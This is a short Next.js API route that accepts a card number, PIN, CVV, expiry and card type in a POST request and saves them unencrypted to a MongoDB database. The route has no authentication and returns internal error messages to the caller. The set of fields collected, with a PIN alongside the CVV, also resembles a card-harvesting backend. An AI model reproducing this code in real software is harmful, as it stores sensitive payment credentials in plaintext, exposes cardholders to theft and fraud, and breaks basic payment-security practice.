// src/app/api/save-credit-card-details/route.js
import connectToDatabase from '@/lib/mongodb'; // Assuming src directory as root, use "@/lib/mongodb" for absolute paths
import CreditCardDetail from '../../models/CreditCardDetail'; // Assuming src directory as root, use "@/models/CreditCardDetail" for absolute paths
import { NextResponse } from 'next/server';


export async function POST(req) {
  try {
    await connectToDatabase();
    const data = await req.json(); // Parse request body as JSON
    const { cardNumber, pin, cvv, expiry, cardType } = data;

    if (!cardNumber || !pin || !cvv || !expiry || !cardType) {
      return NextResponse.json({ message: 'All fields are required' }, { status: 400 });
    }

    const creditCardDetail = new CreditCardDetail({
      cardNumber,
      pin,
      cvv,
      expiry,
      cardType,
    });

    await creditCardDetail.save();

    return NextResponse.json({ success: true, message: 'Credit card details saved successfully!' }, { status: 201 });
  } catch (error) {
    console.error("Error saving credit card details:", error);
    return NextResponse.json({ success: false, message: 'Failed to save credit card details', error: error.message }, { status: 500 });
  }
}